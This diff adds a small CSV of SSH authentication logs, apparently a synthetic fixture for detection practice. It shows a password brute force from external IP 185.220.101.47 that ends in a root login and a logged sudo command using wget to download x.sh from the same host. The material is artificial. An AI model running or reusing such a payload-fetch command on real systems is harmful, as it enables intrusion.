@@ -1,0 +1,17 @@
+timestamp,source_ip,username,auth_method,result,message,port
+2026-01-29 09:00:00,10.0.1.42,alice,publickey,SUCCESS,"Accepted publickey",62174
+2026-01-29 09:00:45,10.0.1.87,bob,publickey,SUCCESS,"Accepted publickey",51203
+2026-01-29 09:01:47,10.0.1.42,alice,publickey,SUCCESS,"Accepted publickey",62890
+2026-01-29 09:09:47,185.220.101.47,admin,password,FAILURE,"Failed password",51222
+2026-01-29 09:09:51,185.220.101.47,root,password,FAILURE,"Failed password",55875
+2026-01-29 09:09:59,185.220.101.47,postgres,password,FAILURE,"Failed password",33164
+2026-01-29 09:10:02,185.220.101.47,ubuntu,password,FAILURE,"Failed password",36168
+2026-01-29 09:10:07,185.220.101.47,test,password,FAILURE,"Failed password",33801
+2026-01-29 09:10:14,185.220.101.47,root,password,SUCCESS,"Accepted password",47133
+2026-01-29 09:10:26,185.220.101.47,root,sudo,SUCCESS,"COMMAND=/usr/bin/wget http://185.220.101.47/x.sh",44070
+2026-01-29 09:10:44,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",44112
+2026-01-29 09:12:19,10.0.1.42,dave,publickey,FAILURE,"Connection closed by client",58001
+2026-01-29 09:12:59,10.0.1.42,dave,publickey,SUCCESS,"Accepted publickey",58120
+2026-01-29 09:14:49,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",44890
+2026-01-29 09:16:17,10.0.1.87,bob,publickey,SUCCESS,"Accepted publickey",51999
+2026-01-29 09:18:22,10.0.1.42,alice,publickey,SUCCESS,"Accepted publickey",63001
